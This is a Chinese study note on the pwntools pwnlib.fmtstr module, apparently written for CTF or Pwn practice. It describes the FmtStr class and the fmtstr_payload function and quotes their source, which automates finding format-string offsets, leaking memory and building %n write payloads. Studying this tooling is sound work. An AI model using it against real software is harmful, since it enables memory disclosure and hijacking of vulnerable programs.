`pwntools` 中定义了 `pwnlib.fmtstr` 的 [[知识点总结/Pwn/读书笔记/格式化字符串]] 漏洞利用工具
该模块中主要定义了一个类 `FmtStr` 和一个函数 `fmtstr_payload`
## `FmtStr` 类
**介绍**
提供自动格式化字符串利用。
它提供一个函数，每次自动化进程与脆弱进程通信时都会调用该函数。
这个函数会接收一个参数，该参数必须包含发送给脆弱进程的有效载荷，并且必须返回进程的返回值。
**参数**
`execute_fmt(function)`：与脆弱进程通信时要调用的函数
`offset(int)`：控制的第一个格式化器偏移量
`padlen(int)`：要在有效负载前添加的 pad 大小
`numbwritten(int)`：已写入的字节数
```
class FmtStr(object):

    def __init__(self, execute_fmt, offset=None, padlen=0, numbwritten=0, badbytes=frozenset()):
        self.execute_fmt = execute_fmt
        self.offset = offset
        self.padlen = padlen
        self.numbwritten = numbwritten
        self.badbytes = badbytes

        if self.offset is None:
            self.offset, self.padlen = self.find_offset()
            log.info("Found format string offset: %d", self.offset)

        self.writes = {}
        self.leaker = MemLeak(self._leaker)

    def leak_stack(self, offset, prefix=b""):
        payload = b"START%%%d$pEND" % offset
        leak = self.execute_fmt(prefix + payload)
        try:
            leak = re.findall(br"START(.*?)END", leak, re.MULTILINE | re.DOTALL)[0]
            leak = int(leak, 16)
        except ValueError:
            leak = 0
        return leak

    def find_offset(self):
        marker = cyclic(20)
        for off in range(1,1000):
            leak = self.leak_stack(off, marker)
            leak = pack(leak)

            pad = cyclic_find(leak[:4])
            if pad >= 0 and pad < 20:
                return off, pad
        else:
            log.error("Could not find offset to format string on stack")
            return None, None

    def _leaker(self, addr):
        # Hack: elfheaders often start at offset 0 in a page,
        # but we often can't leak addresses containing null bytes,
        # and the page below elfheaders is often not mapped.
        # Thus the solution to this problem is to check if the next 3 bytes are
        # "ELF" and if so we lie and leak "\x7f"
        # unless it is leaked otherwise.
        if addr & 0xfff == 0 and self.leaker._leak(addr+1, 3, False) == b"ELF":
            return b"\x7f"

        fmtstr = fit({
          self.padlen: b"START%%%d$sEND" % (self.offset + 16//context.bytes),
          16 + self.padlen: addr
        })

        leak = self.execute_fmt(fmtstr)
        leak = re.findall(br"START(.*)END", leak, re.MULTILINE | re.DOTALL)[0]

        leak += b"\x00"

        return leak

    def execute_writes(self):
        """execute_writes() -> None

        Makes payload and send it to the vulnerable process

        Returns:
            None

        """
        fmtstr = randoms(self.padlen).encode()
        fmtstr += fmtstr_payload(self.offset, self.writes, numbwritten=self.padlen + self.numbwritten, badbytes=self.badbytes, write_size='byte')
        self.execute_fmt(fmtstr)
        self.writes = {}

    def write(self, addr, data):
        self.writes[addr] = data

```
## `fmtstr_payload` 函数
**介绍**
使用给定的参数生成有效载荷
**参数**
`offset(int)`：您控制的第一个格式化器的偏移量
`writes(dict)`：包含 addr 和 value 的 dict ``{addr: value, addr2: value2}``
`numbwritten(int)`：printf 函数已写入的字节数
`write_size(str)`：必须是``字节``、``短``或``整数``。说明是否要逐个字节写入、逐个短字节写入或逐个 int 写入（hhn、hn 或 n）
`overflows(int)`：为减少格式字符串的长度，需要容忍多少额外的溢出（大小为 sz）。
`strategy(str)`：“fast ”或 “small”（默认为 “small”，如果写入次数较多，可使用 “fast”）。
`no_dollars(bool)`：是否使用 $ 符号生成有效载荷的标志。

```
def fmtstr_payload(offset, writes, numbwritten=0, write_size='byte', write_size_max='long', overflows=16, strategy="small", badbytes=frozenset(), offset_bytes=0, no_dollars=False):
    sz = WRITE_SIZE[write_size]
    szmax = WRITE_SIZE[write_size_max]
    all_atoms = make_atoms(writes, sz, szmax, numbwritten, overflows, strategy, badbytes)

    fmt = b""
    for _ in range(1000000):
        data_offset = (offset_bytes + len(fmt)) // context.bytes
        fmt, data = make_payload_dollar(offset + data_offset, all_atoms, numbwritten=numbwritten, no_dollars=no_dollars)
        fmt = fmt + cyclic((-len(fmt)-offset_bytes) % context.bytes)

        if len(fmt) + offset_bytes == data_offset * context.bytes:
            break
    else:
        raise RuntimeError("this is a bug ... format string building did not converge")

    return fmt + data
```